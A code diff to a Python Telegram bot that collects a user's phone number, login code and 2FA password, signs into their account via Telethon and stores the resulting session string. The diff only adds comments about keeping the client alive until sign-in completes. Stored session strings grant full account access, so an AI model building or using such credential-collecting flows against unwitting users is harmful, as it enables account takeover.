@@ -292,10 +292,12 @@ async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await client.disconnect()
             TEMP.pop(user.id, None)
             return
+        
+        # ✅ CRITICAL FIX: Keep client alive until sign_in completes
         TEMP[user.id].update({
             'state': 'AWAIT_CODE',
             'phone': phone,
-            'client': client,
+            'client': client,  # ← Client stays connected
             'phone_code_hash': phone_code_hash
         })
         await update.message.reply_text(
@@ -313,18 +315,21 @@ async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         try:
             await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
         except PhoneCodeExpiredError:
+            # ✅ Keep client alive for retry/resend
             await update.message.reply_text(
                 '❌ Code expired.\n\nUse the button below to get a new one.',
                 reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('🔄 Resend Code', callback_data='resend_code')]])
             )
             return
         except PhoneCodeInvalidError:
+            # ✅ Keep client alive for retry
             await update.message.reply_text(
                 '❌ Invalid code. Please try again.',
                 reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('🔄 Resend Code', callback_data='resend_code')]])
             )
             return
         except SessionPasswordNeededError:
+            # ✅ Client stays alive for 2FA password
             TEMP[user.id]['state'] = 'AWAIT_PASSWORD'
             await update.message.reply_text('🔐 Two-step password enabled.\n\nSend your 2FA password.')
             return
@@ -337,7 +342,7 @@ async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             TEMP.pop(user.id, None)
             return
 
-        # success
+        # ✅ SUCCESS - Only now disconnect
         session_str = StringSession(client.session).save()
         sessions = load_sessions()
         user_sessions = sessions.get(str(user.id), [])
